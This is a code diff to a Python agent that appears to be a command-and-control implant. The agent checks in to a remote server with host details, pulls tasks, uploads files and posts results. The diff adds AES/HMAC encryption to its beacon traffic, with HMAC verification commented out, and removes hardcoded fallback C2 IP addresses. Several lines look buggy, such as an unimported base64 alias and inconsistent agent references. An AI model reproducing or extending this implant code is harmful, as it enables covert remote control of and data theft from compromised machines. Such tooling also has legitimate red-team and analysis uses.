@@ -14,6 +14,13 @@ import platform
 import os
 import getpass
 
+from Crypto.Hash import SHA256, SHA512, SHA1, MD5, HMAC
+from Crypto.Cipher import AES, PKCS1_OAEP
+from Crypto.Random import get_random_bytes
+from Crypto.Util.Padding import unpad, pad
+from Crypto.PublicKey import RSA
+from base64 import b64decode, b64encode
+
 
 # Global dict containing name and code of the dynamic functions loaded 
 
@@ -46,6 +53,8 @@ class Agent:
     Jitter = "callback_jitter"
     KillDate = "killdate"
     Script = ""
+    encryption_key = "AESPSK"
+    decryption_key = "AESPSK"
 
 
 def agent_encoder(agent):
@@ -62,7 +71,38 @@ def agent_encoder(agent):
             'Jitter': agent.Jitter,
             'KillDate': agent.KillDate,
             'Script': agent.Script,
+            'encryption_key': agent.encryption_key,
+            'decryption_key': agent.decryption_key,
         }
+   
+
+def encrypt_AES256(data, key=Agent.encryption_key):
+    print(key)
+    key = base64.b64decode(key)
+    data = json.dumps(data).encode()
+    h = HMAC.new(key, digestmod=SHA256)
+    iv = get_random_bytes(16)  # generate a new random IV
+    cipher = AES.new(key, AES.MODE_CBC, iv=iv)
+    ciphertext = cipher.encrypt(pad(data, 16))
+    h.update(iv + ciphertext)
+    return iv + ciphertext + h.digest()
+
+def decrypt_AES256(data, key=Agent.encryption_key):
+    key = base64.b64decode(key)
+    # Decode and remove UUID from the message first
+    data = base64.b64decode(data)
+    data = data[36:]
+    # hmac should include IV
+    mac = data[-32:]  # sha256 hmac at the end
+    iv = data[:16]  # 16 Bytes for IV at the beginning
+    message = data[16:-32]  # the rest is the message
+    h = HMAC.new(key=key, msg=iv + message, digestmod=SHA256)
+    # h.verify(mac)
+    decryption_cipher = AES.new(key, AES.MODE_CBC, iv=iv)
+    decrypted_message = decryption_cipher.decrypt(message)
+    # now to remove any padding that was added on to make it the right block size of 16
+    decrypted_message = unpad(decrypted_message, 16)
+    return json.loads(decrypted_message)
    
 
 def to64(data):
@@ -82,6 +122,23 @@ def getIP():
     s.connect(("8.8.8.8", 80))
     return s.getsockname()[0]
 
+def send(response, uuid):
+
+    if Agent.encryption_key != "":
+        enc = encrypt_AES256(response)
+        message = base64.b64encode(uuid.encode() + enc).decode("utf-8")
+        x = requests.post(Agent.Server + ":" + Agent.Port + Agent.URI, data = message, headers=Agent.UserAgent)
+        print(x)
+        dec = decrypt_AES256(x.text)
+        return dec
+
+    else:
+        serialized = json.dumps(response)
+        message = to64(serialized)
+        uuid = to64(uuid)
+        x = requests.post(agent.Server + ":" + agent.Port + agent.URI, data = uuid + message, headers=agent.UserAgent)
+        res = from64(x.text)
+        return res
 
 def checkin(agent):
 
@@ -98,28 +155,13 @@ def checkin(agent):
         "uuid": agent.PayloadUUID,
         "architecture": platform.architecture(),
         }
-    serialized = json.dumps(checkin_data)
 
-    message = to64(serialized)
-    uuid = to64(agent.PayloadUUID)
-    
-    x = ""
-    try:
-        x = requests.post(agent.Server + ":" + agent.Port + agent.URI, data = uuid + message, headers=agent.UserAgent)
-    except:
-        try:
-            print("[P2P server not found. Switching to 194.195.242.157]")
-            agent.Server = "http://194.195.242.157"
-            agent.Port = "9090"
-            x = requests.post(agent.Server + ":" + agent.Port + agent.URI, data = uuid + message, headers=agent.UserAgent)
-        except:
-            print("[P2P server not found. Switching to main server]")
-            agent.Server = "http://87.3.200.118"
-            agent.Port = "80"
-            x = requests.post(agent.Server + ":" + agent.Port + agent.URI, data = uuid + message, headers=agent.UserAgent)
-    res = from64(x.text)
+
+    res = send(checkin_data, Agent.PayloadUUID)
 
     agent.UUID = res['id']
+
+
 
 
 def get_tasks():
@@ -128,14 +170,8 @@ def get_tasks():
         'action': "get_tasking",
         'tasking_size': -1
     }
-    serialized = json.dumps(tasks)
 
-    message = to64(serialized)
-    uuid = to64(agent.UUID)
-
-    x = requests.post(agent.Server + ":" + agent.Port + agent.URI, data = uuid + message, headers=agent.UserAgent)
-
-    task_list = from64(x.text)
+    task_list = send(tasks, agent.UUID)
 
     if task_list:
         if task_list["tasks"]:
@@ -161,15 +197,8 @@ def reverse_upload(task_id, file_id):
         'full_path': "",
         'task_id': task_id,
     }
-    serialized = json.dumps(upload)
 
-    message = to64(serialized)
-    uuid = to64(agent.PayloadUUID)
-
-    x = requests.post(agent.Server + agent.URI, data = uuid + message, headers=agent.UserAgent)
-    
-    res = from64(x.text)
-    res = res['chunk_data']
+    res = send(upload, agent.UUID)
 
     response_bytes = res.encode('utf-8')
     response_decode = base64.b64decode(response_bytes)
@@ -200,13 +229,7 @@ def post_result():
         }
         responses = []
 
-    serialized = json.dumps(response)
-    message = to64(serialized)
-    uuid = to64(agent.UUID)
-
-    x = requests.post(agent.Server + ":" + agent.Port + agent.URI, data = uuid + message, headers=agent.UserAgent)
-
-    result = from64(x.text)
+    result = send(response, agent.UUID)
 
     if "delegates" in result:
         for m in result["delegates"]:
